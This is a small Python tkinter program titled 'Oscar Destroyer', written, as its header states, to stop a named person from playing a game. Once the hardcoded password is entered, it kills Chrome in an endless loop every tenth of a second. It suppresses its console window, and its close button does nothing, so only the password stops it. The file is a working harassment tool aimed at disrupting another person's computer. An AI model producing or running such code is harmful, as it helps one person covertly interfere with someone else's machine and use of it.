# File: oscar_destroyer.py
# By: Huy2007Chuck
# For destroying Oscar's dream to become the best Dungeon Quest player

import os
import subprocess
import sys
import time
import tkinter as tk

password = "huy"
print(os.getpid())


def disable_event():
    pass


def run():
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

    while True:
        try:
            subprocess.call('taskkill /F /IM chrome.exe', startupinfo=si)
            root.update()
            time.sleep(0.1)
        except:
            pass


def check_pass(event):
    p = ent.get()
    if p == password:
        root.deiconify()
        login.destroy()
        run()


def check_pass2(event):
    p = e.get()
    if p == password:
        root.destroy()
        os.kill(os.getpid(), 9)


root = tk.Tk()
root.geometry("600x260")
root.title("Oscar Destroyer")

login = tk.Toplevel()
login.geometry("300x130")
login.title("Oscar Destroyer")

lbl = tk.Label(login, text="Password", font=("Segoe UI", 20))
lbl.pack(fill=tk.X, pady=10)

ent = tk.Entry(login, show="\u2022", width=25)
ent.pack(pady=20)
ent.focus_set()
ent.bind("<Return>", check_pass)


l = tk.Label(root, text="Program is running", font=("Segoe UI", 20))
l.pack(fill=tk.X, pady=20)

l2 = tk.Label(root, text="Enter password to terminate", font=("Segoe UI", 20))
l2.pack(fill=tk.X, pady=20)

e = tk.Entry(root, show="\u2022", width=25)
e.pack(pady=30)
e.focus_set()
e.bind("<Return>", check_pass2)


root.withdraw()
root.protocol("WM_DELETE_WINDOW", disable_event)
root.mainloop()
